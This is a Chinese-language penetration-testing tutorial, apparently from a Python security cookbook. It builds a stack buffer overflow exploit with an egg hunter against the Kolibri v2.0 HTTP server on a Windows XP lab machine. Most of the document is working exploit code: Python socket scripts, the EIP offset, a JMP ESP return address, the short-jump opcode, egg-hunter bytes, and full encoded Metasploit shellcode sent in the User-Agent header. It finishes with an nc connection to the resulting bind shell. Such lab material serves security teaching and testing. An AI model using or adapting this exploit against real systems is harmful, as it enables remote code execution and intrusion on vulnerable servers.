在缓冲区溢出中，我们劫持执行流并重定向到包含我们缓冲区一部分和该缓冲区中的指令的 CPU 寄存器。但是，如果缓冲区大小非常小，我们无法注入任何有效载荷。因此，我们无法利用这个漏洞。在这种情况下，我们必须检查两种可能的选项。首先检查 EIP 寄存器被覆盖之前缓冲区的位置是否位于内存中。另一个选项是内存中不同区域的缓冲区段，附近的缓冲区段，以便我们可以跳转到偏移量。

使用一组指令创建了一个 egg hunter，这些指令被翻译成操作码。因此，egg hunters 可以用于搜索整个内存范围，包括堆栈和堆，以查找最终阶段的 shell 代码，并将执行流重定向到 shell 代码。

Egg hunters 包括一个用户定义的四字节标记，它将用于在内存中搜索，直到找到这个标记重复两次为止。当它找到标记时，它将重定向执行流到标记后面，我们的 shell 代码所在的地方。

# 准备就绪

我们需要另一个应用程序来演示创建利用的方法。在这里，我们使用 Kolibri v2.0 HTTP 服务器。可以从以下网址下载：[`rejahrehim.com/assets/sample-package/Kolibri_sample.zip`](https://rejahrehim.com/assets/sample-package/Kolibri_sample.zip)。

我们的受害机是一个 Windows XP 32 位机器。确保在其中安装了带有`mona.py`的 Immunity Debugger。

# 如何做...

以下是使用 egg hunters 生成利用脚本的步骤：

1.  我们必须创建一个新的利用文件。因此创建`kolibri_exploit.py`并在编辑器中打开它。

1.  我们可以从向服务器提交一个大缓冲区开始。因此添加以下代码。确保使用正确的 IP 地址更新 IP 地址为您的易受攻击机器的正确 IP 地址：

```py
#!/usr/bin/python   
import socket 
import os 
import sys   
buff = "A"*600   
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  使用调试器打开易受攻击的应用程序，选择`kolibri.exe`。

1.  然后运行我们创建的利用脚本：

```py
python kolibri_exploit.py
```

这将像往常一样使应用程序崩溃：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00106.jpeg)

1.  然后用模式更改`A`缓冲区。我们可以使用模式生成器创建一个模式。用模式更新代码。我们的脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import os 
import sys  
buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  重新启动应用程序并再次运行脚本。这也将使应用程序崩溃。然后使用`mona`获取有关寄存器的详细信息。为此，在 Immunity Debugger 控制台中提供以下命令：

```py
!mona findmsp  
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00107.gif)

从中我们可以确定在 515 字节后 EIP 可以被四个字节覆盖

1.  根据信息，我们可以更新缓冲区如下：

```py
buf = "A"*515 + [EIP] + "B"*81     
```

1.  现在我们可以获取一个地址，将执行流程重定向到 ESP 寄存器。为此，我们可以使用`mona.py`：

```py
!mona jmp -r esp     
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00108.jpeg)

我们可以从中选择一个指针，并将其放置在我们的缓冲区中。我们可以选择以下指针：

```py
0x7e45b310 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)  
```

此外，我们将在缓冲区中放置 egg hunter，并进行短跳转。为此，我们必须在最后包含短跳转的操作码。因此，相应地更新缓冲区，包括指针和短跳转的操作码。短跳转的操作码可以计算如下。短跳转操作码以`\xEB`开头，后面跟着我们需要跳转的距离。这里我们需要向后跳转 60 个字节。

因此，使用计算器将-60 十进制转换为十六进制：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00109.jpeg)![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00110.jpeg)

1.  现在，结合这两者，操作码将如下所示：`\xEB\xC4`

1.  现在，我们的脚本将如下所示：

```py
#!/usr/bin/python  
import socket 
import os 
import sys 
buff = "A"*515 + "\x10\xb3\x54\x7e" +"\xEB\xC4"  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  现在重新启动应用程序和调试器，再次运行脚本。通过这个执行，流程将从 EIP 重定向到 ESP，因为 ESP 包含我们的短跳转，并且它将向后跳转 60 个字节，最终到达我们放置`A`缓冲区的区域：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00111.gif)

1.  现在我们可以使用`mona.py`生成一个 egg hunter，并将其包含在脚本中。

在 Immunity Debugger 控制台中发出以下命令，并复制生成的 egg hunter 代码：

```py
!mona help egg 
!mona egg -t b33f 
```

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-cb/img/00112.gif)

1.  使用 egg hunter 代码更新脚本。现在我们的脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import os 
import sys  
hunter = ( 
"\x66\x81\xca\xff" 
"\x0f\x42\x52\x6a" 
"\x02\x58\xcd\x2e" 
"\x3c\x05\x5a\x74" 
"\xef\xb8\x62\x33" 
"\x33\x66\x8b\xfa"  
"\xaf\x75\xea\xaf" 
"\x75\xe7\xff\xe7")  
buff = "A"*478 + hunter + "A"*5 + "\x10\xb3\x54\x7e" +"\xEB\xC4"  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  现在使用 Metasploit 生成 shell 代码，并将 shell 包含在脚本中，将 shell 代码推送到服务器。因此，我们的最终脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import os 
import sys  
hunter = ( 
"\x66\x81\xca\xff" 
"\x0f\x42\x52\x6a" 
"\x02\x58\xcd\x2e" 
"\x3c\x05\x5a\x74" 
"\xef\xb8\x62\x33" 
"\x33\x66\x8b\xfa"  
"\xaf\x75\xea\xaf" 
"\x75\xe7\xff\xe7")  
shellcode = ( 
"\xdb\xcf\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49\x49\x49" 
"\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58" 
"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42" 
"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c" 
"\x4a\x48\x6d\x59\x67\x70\x77\x70\x67\x70\x53\x50\x4d\x59\x4b" 
"\x55\x75\x61\x49\x42\x35\x34\x6c\x4b\x52\x72\x70\x30\x6c\x4b" 
"\x43\x62\x54\x4c\x4c\x4b\x62\x72\x76\x74\x6c\x4b\x72\x52\x35" 
"\x78\x36\x6f\x6e\x57\x42\x6a\x76\x46\x66\x51\x6b\x4f\x50\x31" 
"\x69\x50\x6c\x6c\x75\x6c\x35\x31\x53\x4c\x46\x62\x34\x6c\x37" 
"\x50\x6f\x31\x58\x4f\x74\x4d\x75\x51\x49\x57\x6d\x32\x4c\x30" 
"\x66\x32\x31\x47\x4e\x6b\x46\x32\x54\x50\x4c\x4b\x62\x62\x45" 
"\x6c\x63\x31\x68\x50\x4c\x4b\x61\x50\x42\x58\x4b\x35\x39\x50" 
"\x33\x44\x61\x5a\x45\x51\x5a\x70\x66\x30\x6c\x4b\x57\x38\x74" 
"\x58\x4c\x4b\x50\x58\x57\x50\x66\x61\x58\x53\x78\x63\x35\x6c" 
"\x62\x69\x6e\x6b\x45\x64\x6c\x4b\x76\x61\x59\x46\x45\x61\x39" 
"\x6f\x70\x31\x39\x50\x6c\x6c\x4f\x31\x48\x4f\x66\x6d\x45\x51" 
"\x79\x57\x46\x58\x49\x70\x50\x75\x39\x64\x73\x33\x61\x6d\x59" 
"\x68\x77\x4b\x53\x4d\x31\x34\x32\x55\x38\x62\x61\x48\x6c\x4b" 
"\x33\x68\x64\x64\x76\x61\x4e\x33\x43\x56\x4c\x4b\x44\x4c\x70" 
"\x4b\x6e\x6b\x51\x48\x35\x4c\x43\x31\x4b\x63\x4e\x6b\x55\x54" 
"\x6e\x6b\x47\x71\x48\x50\x4c\x49\x31\x54\x45\x74\x36\x44\x43" 
"\x6b\x43\x6b\x65\x31\x52\x79\x63\x6a\x72\x71\x39\x6f\x6b\x50" 
"\x56\x38\x33\x6f\x50\x5a\x4c\x4b\x36\x72\x38\x6b\x4c\x46\x53" 
"\x6d\x42\x48\x47\x43\x55\x62\x63\x30\x35\x50\x51\x78\x61\x67" 
"\x43\x43\x77\x42\x31\x4f\x52\x74\x35\x38\x70\x4c\x74\x37\x37" 
"\x56\x37\x77\x4b\x4f\x78\x55\x6c\x78\x4c\x50\x67\x71\x67\x70" 
"\x75\x50\x64\x69\x49\x54\x36\x34\x36\x30\x35\x38\x71\x39\x6f" 
"\x70\x42\x4b\x55\x50\x79\x6f\x4a\x75\x66\x30\x56\x30\x52\x70" 
"\x76\x30\x77\x30\x66\x30\x73\x70\x66\x30\x62\x48\x68\x6a\x54" 
"\x4f\x4b\x6f\x4b\x50\x79\x6f\x78\x55\x4f\x79\x59\x57\x75\x61" 
"\x6b\x6b\x42\x73\x51\x78\x57\x72\x35\x50\x55\x77\x34\x44\x4d" 
"\x59\x4d\x36\x33\x5a\x56\x70\x66\x36\x43\x67\x63\x58\x38\x42" 
"\x4b\x6b\x64\x77\x50\x67\x39\x6f\x4a\x75\x66\x33\x33\x67\x73" 
"\x58\x4f\x47\x4d\x39\x55\x68\x69\x6f\x49\x6f\x5a\x75\x33\x63" 
"\x32\x73\x53\x67\x42\x48\x71\x64\x6a\x4c\x47\x4b\x59\x71\x59" 
"\x6f\x5a\x75\x30\x57\x4f\x79\x78\x47\x61\x78\x34\x35\x30\x6e" 
"\x70\x4d\x63\x51\x39\x6f\x69\x45\x72\x48\x75\x33\x50\x6d\x55" 
"\x34\x57\x70\x6f\x79\x5a\x43\x43\x67\x71\x47\x31\x47\x54\x71" 
"\x5a\x56\x32\x4a\x52\x32\x50\x59\x66\x36\x58\x62\x39\x6d\x71" 
"\x76\x4b\x77\x31\x54\x44\x64\x65\x6c\x77\x71\x37\x71\x4c\x4d" 
"\x37\x34\x57\x54\x34\x50\x59\x56\x55\x50\x43\x74\x61\x44\x46" 
"\x30\x73\x66\x30\x56\x52\x76\x57\x36\x72\x76\x42\x6e\x46\x36" 
"\x66\x36\x42\x73\x50\x56\x65\x38\x42\x59\x7a\x6c\x67\x4f\x4e" 
"\x66\x79\x6f\x4a\x75\x4d\x59\x6b\x50\x62\x6e\x76\x36\x42\x66" 
"\x4b\x4f\x36\x50\x71\x78\x54\x48\x4c\x47\x75\x4d\x51\x70\x4b" 
"\x4f\x48\x55\x6f\x4b\x6c\x30\x78\x35\x6f\x52\x33\x66\x33\x58" 
"\x6c\x66\x4f\x65\x6f\x4d\x4f\x6d\x6b\x4f\x7a\x75\x75\x6c\x56" 
"\x66\x51\x6c\x65\x5a\x4b\x30\x79\x6b\x69\x70\x51\x65\x77\x75" 
"\x6d\x6b\x30\x47\x36\x73\x31\x62\x62\x4f\x32\x4a\x47\x70\x61" 
"\x43\x4b\x4f\x4b\x65\x41\x41")  
buff = "A"*478 + hunter + "A"*5 + "\x10\xb3\x54\x7e" +"\xEB\xC4"  
shell = "b33fb33f" + shellcode  
buffer = ( 
"HEAD /" + buff + " HTTP/1.1\r\n" 
"Host: 192.168.1.37:8080\r\n" 
"User-Agent: " + shell + "\r\n" 
"Keep-Alive: 115\r\n" 
"Connection: keep-alive\r\n\r\n")   
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
expl.connect(("192.168.1.37", 8080)) 
expl.send(buffer) 
expl.close() 
```

1.  现在在调试器中重新启动应用程序并运行脚本进行利用。使用`nc`命令检查利用：

```py
nc -nv 192.168.1.37 9988  
```
